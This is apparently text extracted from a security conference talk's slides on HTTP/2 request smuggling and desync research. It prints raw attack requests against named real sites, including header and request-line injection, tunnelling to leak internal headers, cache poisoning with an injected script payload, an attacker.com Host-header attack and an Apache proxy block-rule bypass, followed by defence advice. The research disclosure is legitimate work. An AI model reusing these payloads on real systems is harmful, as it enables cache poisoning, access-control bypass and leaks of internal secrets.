H2.TE via header name injection

Header names unfiltered
Problem:
:method POST foo chunked
transfer-encoding

GET / HTTP/1.1 foo transfer-encoding: chunked host: ecosystem.atlassian.net

Solution:
:method POST foo: bar chunked transfer-encoding

GET / HTTP/1.1 foo: bar transfer-encoding: chunked host: ecosystem.atlassian.net

H2.TE via request line injection

Pseudo-headers unfiltered
:method GET / HTTP/1.1 Transfer-encoding: chunked x: x
:path /ignored

GET / HTTP/1.1 transfer-encoding: chunked x: x /ignored HTTP/1.1 Host: eco.atlassian.net

\r\n blocked, but \r and \n allowed individually
:method POST :path / HTTP/1.1\n Host: eco.atlassian.net\n \n GET /robots.txt HTTP/1.1\n x: x

Tunnelling confirmation

Does the front-end think it's sending one response?

POST / HTTP/1.1 Host: example.com Transfer-Encoding: chunked
0
GET / HTTP/1.1 Host: example.com

:method POST :path /
:authority example.com transfer-encoding chunked 0

Tunnel-vision

Problem: Front-end reads $content-length bytes from back-end

HTTP/1.1 200 OK Content-Length: 7

0
POST / HTTP/1.1 ...

Never read by front-end

A server MAY send a Content-Length header field in a response to a HEAD request - RFC 7230

Leaking internal headers via tunnelling

:method POST :path /blog
:authority bitbucket.org foo bar Host: bitbucket.wpengine.com Content-Length: 200

foo=bar

s=cow

POST /blog HTTP/1.1 Foo: bar Host: bitbucket.wpengine.com Content-Length: 200
s=cow SSLClientCipher: TLS_AES_128 Host: bitbucket.wpengine.com Content-length: 7
foo=bar

:method PUT :path /!api/internal/snippets

SSLClientCertStatus: NoClientCert X-Forwarded-For-Key: redacted-secret

Cache poisoning via tunnelling
Poison https://bitbucket.org/blog/?x=dontpoisoneveryone with malicious JS: :method HEAD :path /blog/?x=dontpoisoneveryone
:authority bitbucket.org foo bar Host: x
GET /wp-admin?<svg/onload=alert(1)> HTTP/1.1 Host: bitbucket.wpengine.com

+$15,000 =$56,000

HTTP/1.1 404 Not Found Content-Type: text/html X-Cache-Info: cached Content-Length: 5891
HTTP/1.1 301 Moved Permanently Location: https://bitbucket.org/wp-admin/?<svg/onload=alert(1)>

HTTP/2 Exploit Primitives

Ambiguous HTTP/2 requests
Duplicate path, method, scheme:
:method GET :path /some-path :path /different-path
:authority example.com
Host-header attacks :authority and host both specify the host... and are both optional! :method GET :authority example.com host attacker.com

URL prefix injection
Path override
:method GET :path /ffx36.js
:authority start.mozilla.org :scheme http://start.mozilla.org/xyz?
HTTP/1.1 301 Moved Permanently Location: https://start.mozilla.org/xyz?://start.mozilla.org/ffx36.js
Enabling Host-header attacks
:method GET :authority redacted.com
:scheme http://psres.net
'Host' header value of request to `http://psres.net/://redacted.com/` doesn't match request target authority

Header name splitting
The inconvenient colon
:method POST :path /
:authority redacted.net transfer-encoding: chunked

GET / HTTP/1.1 Host: redacted.net transfer-encoding: chunked:

:method GET :path /
:authority example.com host: psres.net 443

GET / HTTP/1.1 Host: example.com Host: psres.net: 443

Request line injection - Apache <2.4.49

Bypass block rules
<ProxyMatch "/admin"> Deny from all

:method GET /admin HTTP/1.1 :path /fakepath
:authority psres.net
Escape folder traps

GET /admin HTTP/1.1 /fakepath HTTP/1.1 Host: internal-server
Ignored by some servers

ProxyPass http://internal-server.net:8080/public

:method GET / HTTP/1.1 :path /fake
:authority psres.net

GET / HTTP/1.1 /public/fake HTTP/1.1 Host: internal-server

essential information

Hidden-HTTP/2
 HTTP/2 and HTTP/1.1 share the same port  Servers advertise HTTP/2 support via ALPN field in TLS handshake  Some forget Detect with:
 HTTP Request Smuggler 'Hidden-H2'  Burp Scanner  curl --http2 --http2-prior-knowledge

Connection state traps
 HTTP/2 promises great request encapsulation
 Sometimes requests break all subsequent requests  Some servers subtly treat the first request differently
 Manage this using:
 Turbo Intruder: requestsPerConnection  Repeater: Send on new connection
 Further research pending

The tooling situation
 Existing tooling does not work
 Libraries/curl refuse to send most attacks  Binary format rules out netcat/openssl
 Turbo Intruder - Custom open-source H/2-stack, use as BApp/CLI/library  http2smugl - Patched Golang, open source, CLI-only  Burp Suite - Exposed via Repeater & Extender-API  Detection: HTTP Request Smuggler
 Timeout probe (favour FP)  HEAD probe (favour FN)
Provided every case study

Defence
Network architects
 Use HTTP/2 end to end instead of downgrading
Server vendors
 Enforce HTTP/1.1 limitations
Developers
 Drop HTTP/1.1 assumptions  Don't trust :scheme
